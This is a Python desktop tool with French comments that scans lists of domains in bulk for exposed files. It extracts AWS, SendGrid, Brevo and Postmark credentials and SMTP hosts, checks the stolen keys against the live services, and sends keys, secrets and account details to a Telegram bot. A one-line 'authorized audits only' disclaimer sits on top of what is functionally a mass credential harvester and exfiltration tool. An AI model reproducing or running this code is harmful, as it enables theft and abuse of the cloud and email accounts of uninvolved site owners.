#!/usr/bin/env python3
# pip install requests boto3 urllib3
# PyInstaller: copie paths.txt à côté de l'exe.
# Usage réservé aux audits autorisés.

from __future__ import annotations

import html
import os
import queue
import re
import ssl
import sys
import threading
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from tkinter import END, BOTH, X, LEFT, RIGHT, W, filedialog, messagebox, scrolledtext
import tkinter as tk

# --- même idée que le binaire Go (évite de saturer le réseau) ---
MAX_THREADS = 700
CHUNK_SIZE = 100_000
TEMP_DIR = "TEMPURL"
CONTEXT_LINES = 10
HTTP_TIMEOUT = 12.0
MAX_IDLE_CONNS = 100
MAX_CONNS_PER_HOST = 50
BUFFER_SIZE = 16384
WRITE_BUFFER_SIZE = 500
MAX_RESPONSE_SIZE = 1 * 1024 * 1024
MAX_CONCURRENT_REQUESTS = 50

# Telegram optionnel (local seulement)
TELEGRAM_DEFAULT_BOT = ""
TELEGRAM_DEFAULT_CHAT = ""

try:
    import boto3
    from botocore.config import Config as BotoConfig
    from botocore.exceptions import ClientError

    HAS_BOTO = True
except ImportError:
    HAS_BOTO = False

try:
    import requests
    from requests.adapters import HTTPAdapter

    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# Couleurs (boutons visibles une fois packagés en exe)
C_BG = "#2b2d42"
C_PANEL = "#3d405b"
C_TEXT = "#edf2f4"
C_MUTED = "#8d99ae"
C_BTN_FILE = "#e07a5f"
C_BTN_FILE_A = "#d4a373"
C_BTN_GO = "#81b29a"
C_BTN_GO_A = "#6a994e"
C_BTN_STOP = "#bc4749"
C_BTN_STOP_A = "#a44a3f"
C_ACCENT = "#f2cc8f"
C_LOG_BG = "#1d1e2e"
C_LOG_FG = "#c9cba3"

RE_AWS_KEY = re.compile(r'["\']?AWS_ACCESS_KEY_ID["\']?\s*[:=]\s*["\']?([^"\'\s]{10,})["\']?', re.I)
RE_AWS_SECRET = re.compile(r'["\']?AWS_SECRET_ACCESS_KEY["\']?\s*[:=]\s*["\']?([^"\'\s]{10,})["\']?', re.I)
RE_AKIA = re.compile(r"\bAKIA[0-9A-Z]{16}\b")
RE_SG1 = re.compile(r"SENDGRID_API_KEY\s*[:=]\s*([^\s]+)")
RE_SG2 = re.compile(r"SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}")
RE_BREVO = re.compile(r"xkeysib-[a-f0-9]{64}-[A-Za-z0-9]{6,16}", re.I)
RE_SMTP_HOST = re.compile(
    r"(?i)\b(?:smtp|mail|email|relay)\.[a-z0-9](?:[a-z0-9.-]*[a-z0-9])?\.(?:[a-z]{2,}|xn--[a-z0-9-]+)\b"
)
RE_POSTMARK = re.compile(
    r"(?i)POSTMARK(?:_SERVER)?_TOKEN\s*[=:]\s*['\"]?([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})"
)

AWS_STS_REGIONS = (
    "us-east-1",
    "us-east-2",
    "us-west-1",
    "us-west-2",
    "eu-west-1",
    "eu-west-2",
    "eu-central-1",
    "ap-southeast-1",
    "ap-northeast-1",
    "ca-central-1",
    "sa-east-1",
)

_session: requests.Session | None = None


def app_dir() -> Path:
    if getattr(sys, "frozen", False):
        return Path(sys.executable).resolve().parent
    return Path(__file__).resolve().parent


def load_paths() -> list[str]:
    p = app_dir() / "paths.txt"
    if not p.is_file():
        raise FileNotFoundError(f"paths.txt manquant à côté du script : {p}")
    seen: set[str] = set()
    out: list[str] = []
    for line in p.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if not line.startswith("/"):
            line = "/" + line
        if "*" in line:
            line = line.replace("main.*.js", "main.js")
            if "*" in line:
                continue
        if line not in seen:
            seen.add(line)
            out.append(line)
    return out


def get_session() -> requests.Session:
    global _session
    if _session is None:
        s = requests.Session()
        a = HTTPAdapter(pool_connections=MAX_IDLE_CONNS, pool_maxsize=MAX_CONNS_PER_HOST, max_retries=0)
        s.mount("https://", a)
        s.mount("http://", a)
        _session = s
    return _session


def join_base_path(base: str, path: str) -> str:
    base = base.rstrip("/")
    if not path.startswith("/"):
        path = "/" + path
    u = urllib.parse.urlsplit(base)
    rel = urllib.parse.urlsplit(path)
    if rel.query:
        q = urllib.parse.parse_qsl(rel.query, keep_blank_values=True)
        return urllib.parse.urlunsplit((u.scheme, u.netloc, rel.path, urllib.parse.urlencode(q), ""))
    return base + path


def http_get(url: str) -> tuple[int | None, bytes]:
    if HAS_REQUESTS:
        try:
            r = get_session().get(
                url,
                timeout=HTTP_TIMEOUT,
                headers={"User-Agent": "Mozilla/5.0"},
                verify=False,
            )
            return r.status_code, r.content[:MAX_RESPONSE_SIZE]
        except Exception:
            return None, b""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=HTTP_TIMEOUT, context=ctx) as resp:
            return resp.getcode(), resp.read(MAX_RESPONSE_SIZE)
    except Exception:
        return None, b""


def validate_sendgrid(key: str) -> tuple[bool, str]:
    if not HAS_REQUESTS:
        return False, "pip install requests"
    try:
        r = get_session().get(
            "https://api.sendgrid.com/v3/user/credits",
            headers={"Authorization": f"Bearer {key}", "Accept": "application/json"},
            timeout=HTTP_TIMEOUT,
            verify=True,
        )
        if r.status_code != 200:
            return False, str(r.status_code)
        d = r.json()
        bits = [f"{k}={d.get(k)}" for k in ("remain", "total", "used") if k in d]
        return True, ", ".join(bits) or r.text[:400]
    except Exception as e:
        return False, str(e)


def validate_brevo(key: str) -> tuple[bool, str]:
    if not HAS_REQUESTS:
        return False, "pip install requests"
    try:
        r = get_session().get(
            "https://api.brevo.com/v3/account",
            headers={"api-key": key, "Accept": "application/json"},
            timeout=HTTP_TIMEOUT,
            verify=True,
        )
        if r.status_code != 200:
            return False, str(r.status_code)
        rem = r.headers.get("X-Sib-RateLimit-Remaining", "")
        return True, f"remaining={rem} {r.text[:500]}"
    except Exception as e:
        return False, str(e)


def validate_aws(ak: str, sk: str) -> tuple[bool, str, str, str]:
    if not HAS_BOTO:
        return False, "", "", "pip install boto3"
    err = ""
    for reg in AWS_STS_REGIONS:
        try:
            c = boto3.client(
                "sts",
                aws_access_key_id=ak,
                aws_secret_access_key=sk,
                region_name=reg,
                config=BotoConfig(connect_timeout=8, read_timeout=8),
            )
            i = c.get_caller_identity()
            return True, reg, i.get("Arn", ""), f"acct={i.get('Account')} uid={i.get('UserId')}"
        except ClientError as e:
            err = str(e)
        except Exception as e:
            err = str(e)
    return False, "", "", err


def send_telegram(bot: str, chat: str, html_text: str) -> None:
    if not bot or not chat:
        return
    u = f"https://api.telegram.org/bot{urllib.parse.quote(bot, safe=':/')}/sendMessage"
    data = urllib.parse.urlencode(
        {"chat_id": chat, "text": html_text[:4000], "parse_mode": "HTML", "disable_web_page_preview": "true"}
    ).encode()
    req = urllib.request.Request(u, data=data, method="POST", headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        urllib.request.urlopen(req, timeout=25).read()
    except Exception:
        pass


def tg_block(title: str, pairs: list[tuple[str, str]]) -> str:
    lines = [f"<b>{html.escape(title)}</b>"]
    for a, b in pairs:
        lines.append(f"{html.escape(a)} <code>{html.escape(b[:3000])}</code>")
    return "\n".join(lines)


def split_domain_file(path: Path) -> list[Path]:
    """Gros fichiers : découpe en morceaux comme le Go (TEMPURL)."""
    lines = path.read_text(encoding="utf-8", errors="replace").splitlines()
    if len(lines) <= CHUNK_SIZE:
        return [path]
    root = app_dir() / TEMP_DIR
    root.mkdir(exist_ok=True)
    chunks: list[Path] = []
    for i in range(0, len(lines), CHUNK_SIZE):
        part = root / f"chunk_{i // CHUNK_SIZE:04d}.txt"
        part.write_text("\n".join(lines[i : i + CHUNK_SIZE]) + "\n", encoding="utf-8")
        chunks.append(part)
    return chunks


def cleanup_temp(chunks: list[Path], original: Path) -> None:
    root = app_dir() / TEMP_DIR
    ores = original.resolve()
    for c in chunks:
        try:
            if c.resolve() != ores and c.is_file():
                c.unlink()
        except OSError:
            pass
    try:
        if root.is_dir() and not any(root.iterdir()):
            root.rmdir()
    except OSError:
        pass


class App(tk.Tk):
    def __init__(self) -> None:
        super().__init__()
        self.title("Scan domaines")
        self.geometry("880x600")
        self.minsize(760, 480)
        self.configure(bg=C_BG)

        try:
            self.paths = load_paths()
        except FileNotFoundError as e:
            self.paths = []
            self._paths_err = str(e)
        else:
            self._paths_err = ""

        self.domain_file: str | None = None
        self._stop = threading.Event()
        self._q: queue.Queue[str] = queue.Queue()
        self._lock = threading.Lock()
        self._seen_tg: set[str] = set()
        self._counted: set[str] = set()
        self._hits = {"aws": 0, "sg": 0, "smtp": 0}

        self.var_aws = tk.StringVar(value="0")
        self.var_sg = tk.StringVar(value="0")
        self.var_smtp = tk.StringVar(value="0")

        pad = {"padx": 14, "pady": 12}
        root = tk.Frame(self, bg=C_BG, **pad)
        root.pack(fill=BOTH, expand=True)

        tk.Label(root, text="Scan chemins + vérif clés", font=("Segoe UI", 14, "bold"), bg=C_BG, fg=C_TEXT).pack(anchor=W)
        tk.Label(
            root,
            text="Liste .txt (1 domaine par ligne). Mets paths.txt dans le même dossier que l'exe.",
            font=("Segoe UI", 9),
            bg=C_BG,
            fg=C_MUTED,
            wraplength=820,
            justify=LEFT,
        ).pack(anchor=W, pady=(2, 10))

        tg = tk.LabelFrame(root, text=" Telegram (optionnel) ", bg=C_PANEL, fg=C_TEXT, padx=8, pady=6)
        tg.pack(fill=X, pady=(0, 10))
        tk.Label(tg, text="Bot token", bg=C_PANEL, fg=C_MUTED).grid(row=0, column=0, sticky=W)
        self.e_bot = tk.Entry(tg, width=52, show="*", bg=C_LOG_BG, fg=C_TEXT, insertbackground=C_TEXT)
        self.e_bot.grid(row=0, column=1, sticky=W, pady=2)
        self.e_bot.insert(0, TELEGRAM_DEFAULT_BOT or os.environ.get("TELEGRAM_BOT_TOKEN", ""))
        tk.Label(tg, text="Chat id", bg=C_PANEL, fg=C_MUTED).grid(row=1, column=0, sticky=W)
        self.e_chat = tk.Entry(tg, width=22, bg=C_LOG_BG, fg=C_TEXT, insertbackground=C_TEXT)
        self.e_chat.grid(row=1, column=1, sticky=W, pady=2)
        self.e_chat.insert(0, TELEGRAM_DEFAULT_CHAT or os.environ.get("TELEGRAM_CHAT_ID", ""))

        row = tk.Frame(root, bg=C_BG)
        row.pack(fill=X, pady=(0, 8))

        self.btn_open = tk.Button(
            row,
            text="  Ouvrir la liste…  ",
            command=self._pick,
            bg=C_BTN_FILE,
            fg="#1a1a1a",
            activebackground=C_BTN_FILE_A,
            activeforeground="#1a1a1a",
            font=("Segoe UI", 10, "bold"),
            relief=tk.FLAT,
            padx=12,
            pady=6,
            cursor="hand2",
        )
        self.btn_open.pack(side=LEFT)

        self.lbl_name = tk.Label(row, text="aucun fichier", bg=C_BG, fg=C_MUTED, font=("Segoe UI", 10))
        self.lbl_name.pack(side=LEFT, padx=(12, 0))

        self.btn_run = tk.Button(
            row,
            text="  Lancer  ",
            command=self._start,
            bg=C_BTN_GO,
            fg="#1b1b1e",
            activebackground=C_BTN_GO_A,
            font=("Segoe UI", 10, "bold"),
            relief=tk.FLAT,
            padx=16,
            pady=6,
            cursor="hand2",
        )
        self.btn_run.pack(side=RIGHT)

        self.btn_halt = tk.Button(
            row,
            text="  Stop  ",
            command=self._stop.set,
            bg=C_BTN_STOP,
            fg=C_TEXT,
            activebackground=C_BTN_STOP_A,
            font=("Segoe UI", 10, "bold"),
            relief=tk.FLAT,
            padx=12,
            pady=6,
            cursor="hand2",
            state=tk.DISABLED,
        )
        self.btn_halt.pack(side=RIGHT, padx=(0, 8))

        stats = tk.Frame(root, bg=C_PANEL, pady=10)
        stats.pack(fill=X, pady=(0, 8))
        for lab, var in (("AWS ok", self.var_aws), ("SendGrid ok", self.var_sg), ("SMTP / divers", self.var_smtp)):
            f = tk.Frame(stats, bg=C_PANEL)
            f.pack(side=LEFT, expand=True, fill=X)
            tk.Label(f, text=lab, bg=C_PANEL, fg=C_MUTED, font=("Segoe UI", 9)).pack()
            tk.Label(f, textvariable=var, bg=C_PANEL, fg=C_ACCENT, font=("Segoe UI", 22, "bold")).pack()

        lf = tk.LabelFrame(root, text=" Log ", bg=C_BG, fg=C_MUTED)
        lf.pack(fill=BOTH, expand=True)
        self.log = scrolledtext.ScrolledText(
            lf, height=16, bg=C_LOG_BG, fg=C_LOG_FG, insertbackground=C_TEXT, font=("Consolas", 9), relief=tk.FLAT, padx=6, pady=6
        )
        self.log.pack(fill=BOTH, expand=True, padx=4, pady=4)

        tk.Label(root, text="threads max ≈ " + str(min(MAX_CONCURRENT_REQUESTS, MAX_THREADS)), bg=C_BG, fg=C_MUTED, font=("Segoe UI", 8)).pack(anchor=W)

        self.after(80, self._flush_log)
        if self._paths_err:
            self.after(100, lambda: messagebox.showerror("paths.txt", self._paths_err))

    def _log(self, s: str) -> None:
        self._q.put(s)

    def _flush_log(self) -> None:
        try:
            while True:
                self.log.insert(END, self._q.get_nowait() + "\n")
                self.log.see(END)
        except queue.Empty:
            pass
        self.after(100, self._flush_log)

    def _bump(self, k: str) -> None:
        with self._lock:
            self._hits[k] = self._hits.get(k, 0) + 1
            (self.var_aws if k == "aws" else self.var_sg if k == "sg" else self.var_smtp).set(str(self._hits[k]))

    def _once(self, cat: str, uid: str) -> bool:
        with self._lock:
            if uid in self._counted:
                return False
            self._counted.add(uid)
        self._bump(cat)
        return True

    def _tg(self, key: str, msg: str) -> None:
        with self._lock:
            if key in self._seen_tg:
                return
            self._seen_tg.add(key)
        send_telegram(self.e_bot.get().strip(), self.e_chat.get().strip(), msg)

    def _pick(self) -> None:
        p = filedialog.askopenfilename(filetypes=[("Texte", "*.txt"), ("Tout", "*.*")])
        if p:
            self.domain_file = p
            self.lbl_name.config(text=Path(p).name, fg=C_ACCENT)

    def _start(self) -> None:
        if not self.paths:
            messagebox.showerror("Erreur", "paths.txt introuvable à côté de l'appli.")
            return
        if not self.domain_file or not Path(self.domain_file).is_file():
            messagebox.showwarning("Fichier", "Choisis un fichier de domaines.")
            return
        if not HAS_REQUESTS:
            messagebox.showerror("Manque", "pip install requests boto3")
            return
        self._stop.clear()
        self.btn_run.config(state=tk.DISABLED)
        self.btn_halt.config(state=tk.NORMAL)
        self.log.delete(1.0, END)
        with self._lock:
            self._hits = {"aws": 0, "sg": 0, "smtp": 0}
            self._counted.clear()
            self._seen_tg.clear()
        self.var_aws.set("0")
        self.var_sg.set("0")
        self.var_smtp.set("0")
        threading.Thread(target=self._worker, daemon=True).start()

    def _body(self, text: str, url: str) -> None:
        km, sm = RE_AWS_KEY.search(text), RE_AWS_SECRET.search(text)
        if km and sm:
            ak, sk = km.group(1).strip(), sm.group(1).strip()
            if RE_AKIA.match(ak) and len(sk) >= 20:
                ok, reg, arn, info = validate_aws(ak, sk)
                if ok:
                    if self._once("aws", f"a:{ak}:{sk}"):
                        self._log(f"ok AWS {url} [{reg}]")
                    self._tg(
                        f"a:{ak}",
                        tg_block(
                            "AWS ok",
                            [("url", url), ("region", reg), ("key", ak), ("secret", sk), ("arn", arn), ("info", info)],
                        ),
                    )

        keys = {m.group(1).strip() for m in RE_SG1.finditer(text)} | set(RE_SG2.findall(text))
        for k in keys:
            if len(k) < 10:
                continue
            ok, q = validate_sendgrid(k)
            if ok:
                if self._once("sg", f"s:{k}"):
                    self._log(f"ok SendGrid {url}")
                self._tg(f"s:{k}", tg_block("SendGrid ok", [("url", url), ("key", k), ("quota", q)]))

        for k in set(RE_BREVO.findall(text)):
            ok, q = validate_brevo(k)
            if ok:
                if self._once("smtp", f"b:{k}"):
                    self._log(f"ok Brevo {url}")
                self._tg(f"b:{k}", tg_block("Brevo ok", [("url", url), ("key", k), ("detail", q)]))

        hosts = RE_SMTP_HOST.findall(text)
        if hosts:
            u = "smtp:" + "|".join(sorted(set(hosts)))
            if self._once("smtp", u):
                self._log(f"smtp hosts {url} ({len(set(hosts))})")
            h = ", ".join(sorted(set(hosts))[:12])
            self._tg(f"h:{url}:{h}", tg_block("SMTP hosts", [("url", url), ("hosts", h)]))

        for tok in set(RE_POSTMARK.findall(text)):
            if self._once("smtp", f"p:{tok}"):
                self._log(f"postmark token {url}")
            self._tg(f"p:{tok}", tg_block("Postmark", [("url", url), ("token", tok)]))

    def _scan_one_domain(self, domain: str) -> None:
        domain = domain.strip()
        if not domain or self._stop.is_set():
            return
        bases = [domain] if "://" in domain else [f"https://{domain}", f"http://{domain}"]
        workers = min(MAX_CONCURRENT_REQUESTS, MAX_THREADS, max(8, len(self.paths) // 3))

        def job(pair: tuple[str, str]):
            b, pth = pair
            u = join_base_path(b, pth)
            code, data = http_get(u)
            if code and 200 <= code < 300 and data:
                return u, data
            return None, None

        tasks = [(b, p) for b in bases for p in self.paths]
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(job, t) for t in tasks]
            for f in as_completed(futs):
                if self._stop.is_set():
                    break
                url, data = f.result()
                if data:
                    try:
                        self._body(data.decode("utf-8", errors="replace"), url or "")
                    except Exception:
                        pass

    def _worker(self) -> None:
        chunks: list[Path] = []
        src = Path(self.domain_file or "")
        try:
            chunks = split_domain_file(src)
            self._log(f"{len(self.paths)} chemins · max {min(MAX_CONCURRENT_REQUESTS, MAX_THREADS)} threads · timeout {HTTP_TIMEOUT}s")
            if not HAS_BOTO:
                self._log("(boto3 manquant → pas de vérif AWS)")
            for chunk_path in chunks:
                if self._stop.is_set():
                    break
                for line in chunk_path.read_text(encoding="utf-8", errors="replace").splitlines():
                    if self._stop.is_set():
                        self._log("arrêt.")
                        break
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    self._log(line)
                    self._scan_one_domain(line)
            if not self._stop.is_set():
                self._log("fini.")
        except Exception as e:
            self._log(f"erreur: {e}")
        finally:
            cleanup_temp(chunks, src)
            self.after(0, lambda: self.btn_run.config(state=tk.NORMAL))
            self.after(0, lambda: self.btn_halt.config(state=tk.DISABLED))


def main() -> None:
    if HAS_REQUESTS:
        import urllib3

        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    App().mainloop()


if __name__ == "__main__":
    main()
